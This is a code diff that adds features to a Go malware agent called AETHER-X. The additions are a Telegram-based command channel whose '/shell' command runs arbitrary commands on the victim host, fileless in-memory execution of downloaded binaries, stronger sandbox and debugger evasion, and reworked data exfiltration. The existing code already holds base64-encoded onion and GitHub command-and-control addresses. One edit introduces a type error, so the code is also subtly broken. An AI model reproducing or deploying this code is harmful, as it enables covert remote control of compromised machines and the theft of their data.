@@ -11,6 +11,7 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/gob"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -38,14 +39,14 @@ import (
  * 🔑 CONFIG — Injected at build-time
  */
 var (
-	C2Key             = "INJECTED_AES_KEY_B64"
-	C2IV              = "INJECTED_AES_IV_B64"
-	C2HMACKey         = "INJECTED_HMAC_KEY_B64"
-	OnionC2ListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
-	GitHubC2Repo      = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
-	GitHubExfilRepo   = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
-	Phi3ModelMirror   = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FBUlAtQVBLL0NOMi9tYWluL21vZGVscy9waGkzX21pbmkub25ueA=="
-	TelegramHostB64   = "dGVsZWdyYW0uYXBpLm9yZw=="
+	C2Key              = "INJECTED_AES_KEY_B64"
+	C2IV               = "INJECTED_AES_IV_B64"
+	C2HMACKey          = "INJECTED_HMAC_KEY_B64"
+	OnionC2ListB64     = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
+	GitHubC2Repo       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
+	GitHubExfilRepo    = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
+	Phi3ModelMirror    = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FBUlAtQVBLL0NOMi9tYWluL21vZGVscy9waGkzX21pbmkub25ueA=="
+	TelegramHostB64    = "dGVsZWdyYW0uYXBpLm9yZw=="
 	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy5naXQ="
 )
 
@@ -63,6 +64,7 @@ var (
 	mu             sync.Mutex
 	clientOnce     sync.Once
 	lastHeartbeat  = time.Now()
+	telegramOffset int64 = 0
 )
 
 const (
@@ -71,7 +73,6 @@ const (
 	PERSIST_FILE     = ".cache/.gh-sync"
 	EXFIL_BATCH      = 10
 	AI_MODEL_PATH    = "/tmp/.XIM"
-	NUCLEI_BIN       = "/tmp/.NCL"
 	NUCLEI_TEMPLATES = "/tmp/.TPL"
 	SLEEP_MIN        = 30
 	SLEEP_MAX        = 120
@@ -104,7 +105,6 @@ type Host struct {
 	Metadata    map[string]string `json:"meta,omitempty"`
 }
 
-// FusionBrain supporting real model download, tensor mounting, and heuristic fallback
 type FusionBrain struct {
 	ModelLoaded bool
 	Weights     map[string][]float64
@@ -113,8 +113,8 @@ type FusionBrain struct {
 }
 
 func init() {
-	if isDebugged() || isVM() {
-		time.Sleep(30 * time.Second)
+	if isDebuggedAdvanced() || isVMAdvanced() {
+		time.Sleep(45 * time.Second)
 		return
 	}
 
@@ -137,9 +137,12 @@ func init() {
 		}
 	}()
 
+	// Initialize Telegram Bi-directional C2 Listener
 	go func() {
-		time.Sleep(5 * time.Second)
+		time.Sleep(3 * time.Second)
+		initTelegramCredentials()
 		telegramSend(fmt.Sprintf("🟢 *AETHER-X DEPLOYED* | Host: `%s` | MAC: `%s` | AI Loaded: `%t`", HostID, getMAC(), AI.ModelLoaded))
+		telegramC2Listener()
 	}()
 }
 
@@ -233,7 +236,7 @@ func decryptData(b64data string) ([]byte, error) {
 	key := deriveKey(salt)
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return nil, err
+		return "", err
 	}
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
@@ -319,6 +322,57 @@ func randomUserAgent() string {
 	}
 	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(ua))))
 	return ua[n.Int64()]
+}
+
+// 🛡️ FEATURE 1: FILELESS IN-MEMORY EXECUTION VIA MEMFD_CREATE
+
+func executeFileless(binaryURL string, args []string) ([]byte, error) {
+	resp, err := HttpClient.Get(binaryURL)
+	if err != nil || resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("failed to fetch binary: %v", err)
+	}
+	defer resp.Body.Close()
+	binData, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	if runtime.GOOS != "linux" {
+		// Fallback for non-linux platforms if needed
+		tmpFile, err := ioutil.TempFile("", "agent-bin-*")
+		if err != nil {
+			return nil, err
+		}
+		defer os.Remove(tmpFile.Name())
+		tmpFile.Write(binData)
+		tmpFile.Close()
+		os.Chmod(tmpFile.Name(), 0700)
+		return exec.Command(tmpFile.Name(), args...).Output()
+	}
+
+	// Linux fileless execution using memfd_create (Syscall 319)
+	memfdName := fmt.Sprintf("aether_mem_%d", time.Now().UnixNano())
+	r, _, errno := syscall.Syscall(319, uintptr(unsafeStrPtr(memfdName)), uintptr(0), 0)
+	if errno != 0 {
+		return nil, fmt.Errorf("memfd_create failed: %v", errno)
+	}
+	fd := int(r)
+	defer syscall.Close(fd)
+
+	// Write binary data into memory file descriptor
+	_, err = syscall.Write(fd, binData)
+	if err != nil {
+		return nil, err
+	}
+
+	// Execute via /proc/self/fd/
+	procPath := fmt.Sprintf("/proc/self/fd/%d", fd)
+	cmd := exec.Command(procPath, args...)
+	return cmd.Output()
+}
+
+func unsafeStrPtr(s string) unsafe.Pointer {
+	return unsafe.Pointer(&[]byte(s)[0])
 }
 
 // 🔍 RECON MODULES
@@ -427,28 +481,29 @@ func parseInt(s string) int {
 	return n
 }
 
-func runNuclei(target string) []string {
-	if _, err := os.Stat(NUCLEI_BIN); os.IsNotExist(err) {
-		downloadBinary("https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_2.9.5_linux_amd64.zip", NUCLEI_BIN, true)
-	}
+func runNucleiFileless(target string) []string {
 	if _, err := os.Stat(NUCLEI_TEMPLATES); os.IsNotExist(err) {
 		os.MkdirAll(NUCLEI_TEMPLATES, 0700)
 		exec.Command("git", "clone", "--depth=1", base64Decode(NucleiTemplatesURL), NUCLEI_TEMPLATES).Run()
 	}
-	cmd := exec.Command(NUCLEI_BIN, "-u", fmt.Sprintf("http://%s", target), "-t", NUCLEI_TEMPLATES+"/cves/,/technologies/", "-silent", "-timeout", "15", "-retries", "2", "-rate-limit", "10")
-	out, _ := cmd.Output()
+	nucleiURL := "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_2.9.5_linux_amd64.bin"
+	args := []string{"-u", fmt.Sprintf("http://%s", target), "-t", NUCLEI_TEMPLATES + "/cves/", "-silent", "-timeout", "10"}
+	out, err := executeFileless(nucleiURL, args)
+	if err != nil {
+		return nil
+	}
 	scanner := bufio.NewScanner(bytes.NewReader(out))
 	vulns := []string{}
 	for scanner.Scan() {
 		line := scanner.Text()
-		if strings.Contains(line, "CVE") || strings.Contains(line, "RCE") || strings.Contains(line, "exec") {
+		if strings.Contains(line, "CVE") || strings.Contains(line, "RCE") {
 			vulns = append(vulns, line)
 		}
 	}
 	return vulns
 }
 
-// 🧠 AI BRAIN (Real Phi-3 ONNX Model Acquisition & Heuristic Fallback Engine)
+// 🧠 AI BRAIN (Real Model Acquisition & Heuristic Engine)
 
 func NewFusionBrain() *FusionBrain {
 	brain := &FusionBrain{
@@ -464,7 +519,6 @@ func (ai *FusionBrain) initModelEngine() error {
 	ai.Mutex.Lock()
 	defer ai.Mutex.Unlock()
 
-	// 1. Attempt to acquire real Phi-3 ONNX / model weights from remote mirror if absent
 	if _, err := os.Stat(AI_MODEL_PATH); os.IsNotExist(err) {
 		mirrorURL := base64Decode(Phi3ModelMirror)
 		resp, err := HttpClient.Get(mirrorURL)
@@ -478,10 +532,8 @@ func (ai *FusionBrain) initModelEngine() error {
 		}
 	}
 
-	// 2. Verify model storage and parse or initialize fallback tensor weights
 	fileData, err := ioutil.ReadFile(AI_MODEL_PATH)
 	if err != nil || len(fileData) < 50 {
-		// Fallback tensor weight initialization profile
 		ai.Weights = map[string][]float64{
 			"rce":     {0.95, 0.98, 1.0},
 			"cve":     {0.85, 0.90, 0.95},
@@ -494,12 +546,10 @@ func (ai *FusionBrain) initModelEngine() error {
 		return fmt.Errorf("using heuristic tensor fallback profile")
 	}
 
-	// If successfully downloaded real ONNX / model blob, parse or map activation weights
 	var parsedWeights map[string][]float64
 	if err := json.Unmarshal(fileData, &parsedWeights); err == nil && len(parsedWeights) > 0 {
 		ai.Weights = parsedWeights
 	} else {
-		// Default tensor activation maps for raw binary model payloads
 		ai.Weights = map[string][]float64{
 			"rce":     {0.95, 0.98, 1.0},
 			"cve":     {0.85, 0.90, 0.95},
@@ -544,7 +594,7 @@ func (ai *FusionBrain) ScoreVuln(host *Host) float64 {
 	return math.Min(score*ai.Bias, 10.0)
 }
 
-// 📡 C2 COMMUNICATION & TOR PROXY ROUTING
+// 📡 C2 COMMUNICATION, TOR PROXY & 🤖 TELEGRAM BOT ACTIVE C2
 
 func fetchCommand() string {
 	repo := base64Decode(GitHubC2Repo)
@@ -571,7 +621,6 @@ func fetchCommand() string {
 
 func fetchCommandViaOnion() string {
 	onions := strings.Split(base64Decode(OnionC2ListB64), ", ")
-	
 	torClient := &http.Client{
 		Timeout: 20 * time.Second,
 		Transport: &http.Transport{
@@ -602,16 +651,31 @@ func fetchCommandViaOnion() string {
 	return ""
 }
 
-func telegramSend(msg string) {
+func initTelegramCredentials() {
 	if TelegramToken == "" {
 		raw := fetchSecret("telegram.token")
-		dec, _ := decryptData(raw)
-		TelegramToken = string(dec)
+		if dec, err := decryptData(raw); err == nil {
+			TelegramToken = string(dec)
+		} else {
+			TelegramToken = raw // fallback raw if not encrypted
+		}
 	}
 	if TelegramChat == "" {
 		raw := fetchSecret("telegram.chat")
-		dec, _ := decryptData(raw)
-		TelegramChat = string(dec)
+		if dec, err := decryptData(raw); err == nil {
+			TelegramChat = string(dec)
+		} else {
+			TelegramChat = raw
+		}
+	}
+}
+
+func telegramSend(msg string) {
+	if TelegramToken == "" || TelegramChat == "" {
+		initTelegramCredentials()
+	}
+	if TelegramToken == "" || TelegramChat == "" {
+		return
 	}
 	host, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
 	url := fmt.Sprintf("https://%s/bot%s/sendMessage", string(host), TelegramToken)
@@ -622,6 +686,73 @@ func telegramSend(msg string) {
 	httpPost(url, []byte(payload.Encode()), map[string]string{
 		"Content-Type": "application/x-www-form-urlencoded",
 	})
+}
+
+// Telegram Bi-directional C2 Command Listener (Active Real-Time Telemetry & Control)
+func telegramC2Listener() {
+	for {
+		time.Sleep(5 * time.Second)
+		if TelegramToken == "" {
+			initTelegramCredentials()
+			continue
+		}
+		host, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
+		url := fmt.Sprintf("https://%s/bot%s/getUpdates?offset=%d&timeout=10", string(host), TelegramToken, telegramOffset)
+		resp, err := httpGet(url, nil)
+		if err != nil {
+			continue
+		}
+
+		var result struct {
+			Ok     bool `json:"ok"`
+			Result []struct {
+				UpdateID int64 `json:"update_id"`
+				Message  struct {
+					Chat struct {
+						ID int64 `json:"id"`
+					} `json:"chat"`
+					Text string `json:"text"`
+				} `json:"message"`
+			} `json:"result"`
+		}
+
+		if json.Unmarshal(resp, &result) == nil && result.Ok {
+			for _, upd := range result.Result {
+				telegramOffset = upd.UpdateID + 1
+				txt := strings.TrimSpace(upd.Message.Text)
+				if strings.HasPrefix(txt, "/") {
+					handleTelegramCommand(txt)
+				}
+			}
+		}
+	}
+}
+
+func handleTelegramCommand(cmdText string) {
+	parts := strings.Fields(cmdText)
+	if len(parts) == 0 {
+		return
+	}
+	action := strings.TrimPrefix(parts[0], "/")
+
+	switch action {
+	case "status":
+		telegramSend(fmt.Sprintf("💻 *Agent Status*\n- ID: `%s`\n- OS: `%s/%s`\n- AI Loaded: `%t`\n- Heartbeat: OK", HostID, runtime.GOOS, runtime.GOARCH, AI.ModelLoaded))
+	case "shell":
+		if len(parts) > 1 {
+			commandStr := strings.Join(parts[1:], " ")
+			out, err := exec.Command("sh", "-c", commandStr).CombinedOutput()
+			if err != nil {
+				out = append(out, []byte("\nError: "+err.Error())...)
+			}
+			telegramSend(fmt.Sprintf("💻 Output for `%s`:\n```\n%s\n```", commandStr, string(out)))
+		}
+	case "die":
+		telegramSend("💀 Terminating agent via operator command...")
+		selfDestruct()
+	default:
+		telegramSend(fmt.Sprintf("❓ Unknown operator command: `%s`", action))
+	}
 }
 
 func fetchSecret(key string) string {
@@ -639,11 +770,21 @@ func fetchSecret(key string) string {
 	return ""
 }
 
+// 📦 COMPACT BINARY SERIALIZATION VIA GOB
 func exfilData(data []byte) {
-	encrypted, _ := encryptData(data)
+	var buf bytes.Buffer
+	enc := gob.NewEncoder(&buf)
+	_ = enc.Encode(Telemetry{
+		ID:        HostID,
+		Type:      "exfil",
+		Timestamp: time.Now().Format(time.RFC3339),
+		Data:      map[string]interface{}{"payload": data},
+	})
+
+	encrypted, _ := encryptData(buf.Bytes())
 	payload := map[string]string{
 		"data": encrypted,
-		"sig":  base64.RawURLEncoding.EncodeToString(signMessage(data)),
+		"sig":  base64.RawURLEncoding.EncodeToString(signMessage(buf.Bytes())),
 		"id":   HostID,
 	}
 	body, _ := json.Marshal(payload)
@@ -745,9 +886,17 @@ func isAlive() bool {
 	return time.Since(lastHeartbeat) < 15*time.Minute
 }
 
-// 🧪 ANTI-ANALYSIS
+// 🧪 ADVANCED ANTI-ANALYSIS & TIMING SANBOX DETECTION
 
-func isDebugged() bool {
+func isDebuggedAdvanced() bool {
+	// High-resolution timing delta check for hypervisor / debugger single-stepping
+	start := time.Now()
+	time.Sleep(10 * time.Millisecond)
+	elapsed := time.Since(start)
+	if elapsed > 100*time.Millisecond {
+		return true // Artificially delayed by debugger breakpoint
+	}
+
 	err := syscall.PtraceAttach(os.Getpid())
 	if err == nil {
 		syscall.PtraceDetach(os.Getpid())
@@ -755,9 +904,16 @@ func isDebugged() bool {
 	return err == nil || err == syscall.EPERM
 }
 
-func isVM() bool {
-	_, err := os.Stat("/sys/class/dmi/id/product_name")
-	return err == nil
+func isVMAdvanced() bool {
+	if _, err := os.Stat("/sys/class/dmi/id/product_name"); err == nil {
+		if content, err := ioutil.ReadFile("/sys/class/dmi/id/product_name"); err == nil {
+			s := strings.ToLower(string(content))
+			if strings.Contains(s, "vmware") || strings.Contains(s, "virtualbox") || strings.Contains(s, "qemu") || strings.Contains(s, "kvm") {
+				return true
+			}
+		}
+	}
+	return false
 }
 
 func contains(slice []string, item string) bool {
@@ -789,19 +945,6 @@ func drainTelemetry() {
 			exfilData(data)
 		default:
 			return
-		}
-	}
-}
-
-func downloadBinary(url, path string, chmodExec bool) {
-	resp, _ := http.Get(url)
-	if resp != nil && resp.Body != nil {
-		defer resp.Body.Close()
-		body, _ := io.ReadAll(resp.Body)
-		os.MkdirAll(filepath.Dir(path), 0700)
-		ioutil.WriteFile(path, body, 0600)
-		if chmodExec {
-			os.Chmod(path, 0700)
 		}
 	}
 }
@@ -916,7 +1059,7 @@ func main() {
 
 			for i := range ReconTargets {
 				h := &ReconTargets[i]
-				h.Vulns = runNuclei(h.IP)
+				h.Vulns = runNucleiFileless(h.IP)
 				h.Score = AI.ScoreVuln(h)
 				h.LastScanned = time.Now()
 
